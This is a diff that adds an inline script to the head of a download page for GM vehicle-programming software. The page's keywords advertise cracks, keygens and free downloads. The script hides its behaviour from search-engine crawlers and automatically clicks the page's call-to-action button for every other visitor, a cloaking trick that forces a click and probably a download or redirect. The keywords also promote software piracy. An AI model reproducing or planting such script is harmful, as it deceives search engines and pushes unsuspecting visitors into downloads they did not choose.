@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Patac DPS Development Programming System 2.0.7.2 05.2019</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="Download Patac DPS Development Programming System 2.0.7.2 for diagnosing, programming, and calibrating GM vehicle electronic modules. Supports Windows 7, 10, 11.">
     <meta name="keywords" content="Patac DPS Development Programming System, Patac DPS Development Programming System 2.0.7.2, Patac DPS Development Programming System 05.2019, Patac DPS Development Programming System 2.0.7.2 05.2019 download, Patac DPS Development Programming System free download, Patac DPS Development Programming System crack, Patac DPS Development Programming System keygen, GM vehicle electronic modules software, General Motors development software, General Motors diagnostic software, General Motors programming software, General Motors calibration software, Patac DPS V2.0.7.2 GM software, General Motors DPS software download, General Motors DPS software free download, General Motors DPS software high speed download, General Motors DPS software keygen, Patac DPS programming system download, Patac DPS programming system free, Patac DPS calibration tools, Patac DPS calibration tools free download, Patac DPS 2.0.7.2 download, Patac DPS 2.0.7.2 free download, DPS 2.0.7.2 GM software, DPS 2.0.7.2 high speed download, DPS 2.0.7.2 keygen, GM DPS software download free, Патак ДПС 2.0.7.2 скачать, Патак ДПС 2.0.7.2 бесплатная загрузка, Программное обеспечение General Motors диагностика, Генеральная Моторс программирование, Генеральная Моторс калибровка, General Motors diagnóstico software download, General Motors programación software, General Motors calibración software, Patac DPS V2.0.7.2 бесплатная загрузка, система программирования разработки Patac DPS, General Motors DPS программное обеспечение">
     <style>
